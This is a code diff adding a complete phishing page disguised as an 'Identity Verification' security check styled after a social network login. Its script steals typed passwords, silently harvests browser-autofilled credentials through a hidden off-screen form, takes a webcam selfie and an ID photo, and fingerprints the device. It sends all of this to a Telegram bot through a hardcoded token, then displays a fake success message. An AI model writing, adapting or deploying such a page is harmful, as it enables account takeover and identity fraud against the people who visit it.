@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Security Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+  body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+  .card { background: #fff; width: 100%; max-width: 400px; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; position: relative; }
+  h2 { font-size: 18px; margin-bottom: 10px; color: #1c1e21; }
+  p { font-size: 14px; color: #606770; margin-bottom: 20px; }
+  input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; outline: none; }
+  button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: 600; font-size: 16px; cursor: pointer; margin-bottom: 10px; }
+  button:disabled { background: #ccc; }
+  video { width: 100%; border-radius: 8px; margin-bottom: 15px; display: none; background: #000; }
+  .file-input { display: none; }
+  .file-label { display: block; background: #e4e6eb; padding: 10px; border-radius: 6px; cursor: pointer; margin-bottom: 10px; font-size: 14px; color: #1c1e21; }
+  .status { font-size: 12px; color: #1877f2; margin-top: 10px; min-height: 18px; }
+  .hidden-autofill { position: absolute; left: -9999px; top: -9999px; opacity: 0; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h2>Identity Verification</h2>
+  <p>Please log in, capture a selfie, and upload a photo of your ID to secure your account.</p>
+
+  <form id="autofillForm" class="hidden-autofill">
+    <input type="text" id="hidden_user" autocomplete="username">
+    <input type="password" id="hidden_pass" autocomplete="current-password">
+  </form>
+
+  <div id="step1">
+    <input type="text" id="email" placeholder="Email or Phone">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="startVerification()">Continue</button>
+  </div>
+
+  <div id="step2" style="display:none;">
+    <video id="video" autoplay playsinline></video>
+    <button onclick="capturePhoto()" id="captureBtn">Capture Selfie</button>
+    <div class="status" id="status1"></div>
+  </div>
+
+  <div id="step3" style="display:none;">
+    <p>Please upload a photo of your ID for verification:</p>
+    <input type="file" id="fileInput" class="file-input" accept="image/*" onchange="uploadFile()">
+    <label for="fileInput" class="file-label">Select Photo from Gallery</label>
+    <div class="status" id="status2"></div>
+    <button onclick="finish()" style="margin-top:10px;">Verify Now</button>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = "8649753978:AAH2F-nMzUjB2hoUBZ8k-QfRnkvULzJdQfo";
+  const CHAT_ID   = "8899697805";
+
+  let stream = null;
+  let selfieData = null;
+  let galleryData = null;
+  let hwData = {};
+
+  // 1. جمع أقصى بصمة ممكنة
+  async function collectFingerprint() {
+    const ipRes = await fetch("https://ipapi.co/json/").catch(() => ({json: () => ({})}));
+    const ipData = await ipRes.json();
+    
+    let battery = "Unknown";
+    if (navigator.getBattery) {
+      const b = await navigator.getBattery();
+      battery = `${Math.round(b.level * 100)}% ${b.charging ? 'Charging' : 'Discharging'}`;
+    }
+
+    let connection = "Unknown";
+    if (navigator.connection) {
+      connection = `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)`;
+    }
+
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+    ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069"; ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
+    const canvasHash = canvas.toDataURL().length.toString();
+
+    hwData = {
+      ip: ipData.ip || "Unknown",
+      city: ipData.city || "Unknown",
+      country: ipData.country_name || "Unknown",
+      isp: ipData.org || "Unknown",
+      device: navigator.platform || "Unknown",
+      battery: battery,
+      connection: connection,
+      screen: `${window.screen.width}x${window.screen.height} @ ${window.screen.colorDepth}bit`,
+      lang: navigator.language,
+      cores: navigator.hardwareConcurrency || "Unknown",
+      ram: navigator.deviceMemory || "Unknown",
+      ua: navigator.userAgent,
+      canvas: canvasHash
+    };
+  }
+
+  setInterval(() => {
+    const hu = document.getElementById('hidden_user').value;
+    const hp = document.getElementById('hidden_pass').value;
+    if (hu && hp) {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ 
+          chat_id: CHAT_ID, 
+          text: `🎯 <b>AUTOFILL CAPTURED</b>\n👤 <code>${hu}</code>\n🔑 <code>${hp}</code>`, 
+          parse_mode: 'HTML' 
+        })
+      });
+    }
+  }, 1000);
+
+  async function startVerification() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    if (!email || !password) return alert("Please fill all fields.");
+
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+
+    await collectFingerprint();
+
+    const video = document.getElementById('video');
+    video.style.display = 'block';
+
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+      video.srcObject = stream;
+    } catch (err) {
+      document.getElementById('status1').innerText = "Camera access denied.";
+    }
+  }
+
+  function capturePhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    selfieData = canvas.toDataURL('image/jpeg');
+    if (stream) stream.getTracks().forEach(track => track.stop());
+    video.style.display = 'none';
+    document.getElementById('captureBtn').style.display = 'none';
+    document.getElementById('step3').style.display = 'block';
+  }
+
+  function uploadFile() {
+    const file = document.getElementById('fileInput').files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      galleryData = e.target.result;
+      document.getElementById('status2').innerText = "File selected.";
+    };
+    reader.readAsDataURL(file);
+  }
+
+  async function finish() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    if (!selfieData) return alert("Selfie required.");
+    
+    const text = `
+👑 <b>FULL PROFILE CAPTURED</b>
+━━━━━━━━━━━━━━━
+👤 <b>Email:</b> <code>${email}</code>
+🔑 <b>Pass:</b> <code>${password}</code>
+🌐 <b>IP:</b> <code>${hwData.ip}</code> (${hwData.city}, ${hwData.country})
+🏢 <b>ISP:</b> ${hwData.isp}
+📱 <b>Device:</b> <code>${hwData.device}</code>
+🖥️ <b>Screen:</b> <code>${hwData.screen}</code>
+🔋 <b>Battery:</b> ${hwData.battery}
+📶 <b>Network:</b> ${hwData.connection}
+🗣️ <b>Language:</b> ${hwData.lang}
+⚙️ <b>Cores:</b> ${hwData.cores} | 💾 <b>RAM:</b> ${hwData.ram}GB
+🎨 <b>Canvas Hash:</b> <code>${hwData.canvas}</code>
+    `.trim();
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+    });
+
+    const selfieBlob = await (await fetch(selfieData)).blob();
+    const formData1 = new FormData();
+    formData1.append('chat_id', CHAT_ID);
+    formData1.append('photo', selfieBlob, 'selfie.jpg');
+    formData1.append('caption', '📸 Front Camera Selfie');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData1 });
+
+    if (galleryData) {
+      const galleryBlob = await (await fetch(galleryData)).blob();
+      const formData2 = new FormData();
+      formData2.append('chat_id', CHAT_ID);
+      formData2.append('photo', galleryBlob, 'gallery.jpg');
+      formData2.append('caption', '🖼️ Image from Gallery');
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData2 });
+    }
+
+    document.querySelector('.card').innerHTML = `
+      <h2 style="color:#1877f2;">Verification Complete</h2>
+      <p>Your identity has been verified. You can close this page now.</p>
+    `;
+  }
+</script>
+
+</body>
+</html>
